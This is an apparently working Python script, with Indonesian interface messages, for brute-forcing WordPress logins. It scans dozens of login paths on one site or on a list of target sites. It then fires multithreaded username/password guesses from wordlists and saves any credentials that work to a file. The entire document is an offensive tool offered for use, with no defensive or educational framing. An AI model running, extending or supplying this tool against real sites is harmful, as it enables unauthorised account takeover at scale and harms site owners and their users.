import requests
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
USERNAME_FILE = "username.txt"
PASSWORD_FILE = "password.txt"
TARGET_FILE = "targets.txt"
SAVE_FILE = "success.txt"
MAX_THREADS = 50  # Increased threads for faster scanning
TIMEOUT = 6
DELAY = 0.05  # Reduced delay for faster scanning

# 80+ WordPress login paths (optimized order)
WP_LOGIN_PATHS = [
    # Standard paths (most common first)
    "/wp-login.php",
    "/wp-admin",
    "/login",
    "/admin",
    "/wp-content/wp-login.php",
    
    # Common subdirectory installations
    "/wp/wp-login.php",
    "/wordpress/wp-login.php",
    "/blog/wp-login.php",
    "/cms/wp-login.php",
    "/site/wp-login.php",
    "/web/wp-login.php",
    "/main/wp-login.php",
    
    # Admin area paths
    "/wp/admin/wp-login.php",
    "/admin/wp/wp-login.php",
    "/admin/wordpress/wp-login.php",
    "/admin/cms/wp-login.php",
    
    # Content directories
    "/content/wp-login.php",
    "/content/wp/wp-login.php",
    "/contents/wp-login.php",
    "/contents/wp/wp-login.php",
    "/html/wp-login.php",
    "/html/wp/wp-login.php",
    "/wp-content/wp-login.php",
    
    # Security/hidden paths
    "/private/wp-login.php",
    "/secure/wp-login.php",
    "/hidden/wp-login.php",
    "/auth/wp-login.php",
    "/protected/wp-login.php",
    
    # Development/testing
    "/dev/wp-login.php",
    "/staging/wp-login.php",
    "/test/wp-login.php",
    
    # Backup/migration
    "/old/wp-login.php",
    "/backup/wp-login.php",
    "/new/wp-login.php",
    
    # Localized
    "/en/wp-login.php",
    "/id/wp-login.php",
    "/us/wp-login.php",
    
    # Management systems
    "/website/wp-login.php",
    "/portal/wp-login.php",
    "/system/wp-login.php",
    
    # Plugin-modified
    "/secure-login",
    "/wp-login.php?action=register",
    "/wp-signup.php",
    
    # Management interfaces
    "/dashboard/wp-login.php",
    "/control/wp-login.php",
    "/manage/wp-login.php",
    "/panel/wp-login.php",
    
    # Deep paths
    "/subdomain/wp/wp-login.php",
    "/clientarea/wp/wp-login.php",
    "/users/wp/wp-login.php",
    
    # Alternative filenames
    "/wplogin.php",
    "/wpadmin.php",
    "/wordpress-login.php",
    "/wp-login",
    "/wpadmin"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_wordlist(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File {filename} tidak ditemukan!{Style.RESET_ALL}")
        return []

def normalize_url(url):
    """Convert any URL format to http://example.com"""
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url.replace('www.', '')
    return url.split('?')[0].rstrip('/')

def detect_wp_login(base_url):
    """Ultra-fast WordPress login detection with parallel scanning"""
    with ThreadPoolExecutor(max_workers=30) as executor:  # Increased detection threads
        futures = {executor.submit(check_path, base_url, path): path for path in WP_LOGIN_PATHS}
        for future in as_completed(futures):
            result = future.result()
            if result:
                executor.shutdown(wait=False)  # Stop other checks once found
                return result
    return None

def check_path(base_url, path):
    """Check single login path with optimized detection"""
    test_url = f"{base_url.rstrip('/')}{path}"
    try:
        # First try HEAD request for faster checking
        response = requests.head(test_url, timeout=3, allow_redirects=True)
        final_url = response.url.lower()
        
        # Quick WordPress indicators
        if any(x in final_url for x in ["wp-login", "wp-admin", "login"]):
            return final_url
        
        # If unsure, verify with GET request
        if response.status_code == 200:
            content = requests.get(test_url, timeout=3).text.lower()
            if "wp-content" in content or "wordpress" in content:
                return test_url
    except:
        return None
    return None

def brute_force(target, creds):
    """Ultra-fast WordPress brute force with session reuse"""
    username, password = creds
    try:
        session = requests.Session()
        response = session.post(
            target,
            data={
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": target.replace("wp-login.php", "wp-admin/")
            },
            timeout=TIMEOUT,
            allow_redirects=False
        )
        
        # Success detection (302 redirect to wp-admin)
        if response.status_code == 302 and "wp-admin" in response.headers.get('Location', ''):
            with open(SAVE_FILE, 'a') as f:
                f.write(f"{target}|{username}:{password}\n")
            print(f"{Fore.GREEN}[SUCCESS] {target} {username}:{password}{Style.RESET_ALL}")
            return True
    except Exception as e:
        pass
    print(f"{Fore.RED}[FAILED] {target} {username}:{password}{Style.RESET_ALL}")
    return False

def print_final_result(success_count):
    print("\n" + "="*50)
    if success_count > 0:
        print(f"{Fore.GREEN}anda success [ hasil {success_count} ]{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}anda gagal mendapatkan [ hasil 0 ]{Style.RESET_ALL}")
    print(f"Hasil tersimpan di: {SAVE_FILE}")
    print("="*50)

def single_target_mode():
    """Mode 1: Single target ultra-fast brute force"""
    target = input("\nMasukkan URL target (contoh.com/www.site.com): ").strip()
    normalized_url = normalize_url(target)
    
    print(f"\n{Fore.CYAN}[*] Scanning 80+ WordPress login paths...{Style.RESET_ALL}")
    start_scan = time.time()
    login_url = detect_wp_login(normalized_url)
    scan_time = time.time() - start_scan
    
    if not login_url:
        print(f"{Fore.RED}[!] Gagal menemukan halaman login{Style.RESET_ALL}")
        print_final_result(0)
        return
    
    print(f"{Fore.GREEN}[+] Ditemukan ({scan_time:.2f}s): {login_url}{Style.RESET_ALL}")
    
    usernames = load_wordlist(USERNAME_FILE)
    passwords = load_wordlist(PASSWORD_FILE)
    
    if not usernames or not passwords:
        print_final_result(0)
        return
    
    # Generate all credential combinations
    creds = [(u, p) for u in usernames for p in passwords]
    
    print(f"\n{Fore.CYAN}[*] Starting brute force ({len(creds)} combinations){Style.RESET_ALL}")
    start_time = time.time()
    success_count = 0
    
    # Ultra-fast parallel brute force
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(brute_force, login_url, c) for c in creds]
        for i, future in enumerate(as_completed(futures), 1):
            if future.result():
                success_count += 1
            if i % 100 == 0:  # Print progress every 100 attempts
                print(f"{Fore.YELLOW}[Progress] {i}/{len(creds)} attempts{Style.RESET_ALL}")
            time.sleep(DELAY)
    
    total_time = time.time() - start_time
    print(f"\n{Fore.CYAN}[*] Brute force completed in {total_time:.2f} seconds{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Speed: {len(creds)/total_time:.2f} attempts/second{Style.RESET_ALL}")
    print_final_result(success_count)

def multi_target_mode():
    """Mode 2: Multi-target parallel scanning"""
    target_file = input("\nMasukkan file target (contoh: targets.txt): ").strip()
    if not os.path.exists(target_file):
        print(f"{Fore.RED}[!] File tidak ditemukan!{Style.RESET_ALL}")
        return
    
    targets = [normalize_url(t) for t in load_wordlist(target_file)]
    if not targets:
        print_final_result(0)
        return
    
    usernames = load_wordlist(USERNAME_FILE)
    passwords = load_wordlist(PASSWORD_FILE)
    
    if not usernames or not passwords:
        print_final_result(0)
        return
    
    creds = [(u, p) for u in usernames for p in passwords]
    total_targets = len(targets)
    success_count = 0
    
    print(f"\n{Fore.CYAN}[*] Starting scan on {total_targets} targets{Style.RESET_ALL}")
    start_time = time.time()
    
    for i, target in enumerate(targets, 1):
        print(f"\n{Fore.YELLOW}[Target {i}/{total_targets}] Scanning: {target}{Style.RESET_ALL}")
        
        login_url = detect_wp_login(target)
        if not login_url:
            print(f"{Fore.RED}[!] No login page found{Style.RESET_ALL}")
            continue
            
        print(f"{Fore.GREEN}[+] Found: {login_url}{Style.RESET_ALL}")
        
        # Fast parallel brute force for each target
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(brute_force, login_url, c) for c in creds]
            for future in as_completed(futures):
                if future.result():
                    success_count += 1
                time.sleep(DELAY)
    
    total_time = time.time() - start_time
    print(f"\n{Fore.CYAN}[*] Scan completed in {total_time:.2f} seconds{Style.RESET_ALL}")
    print_final_result(success_count)

def main():
    clear_screen()
    print(f"\n{Fore.BLUE}=== ULTRA-FAST WORDPRESS BRUTE FORCE ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}1. Single Target (Auto-Detect + Brute Force){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}2. Multi Target (File Input){Style.RESET_ALL}")
    
    choice = input("\nPilih mode (1/2): ").strip()
    if choice == "1":
        single_target_mode()
    elif choice == "2":
        multi_target_mode()
    else:
        print(f"{Fore.RED}[!] Pilihan tidak valid{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Dihentikan pengguna{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
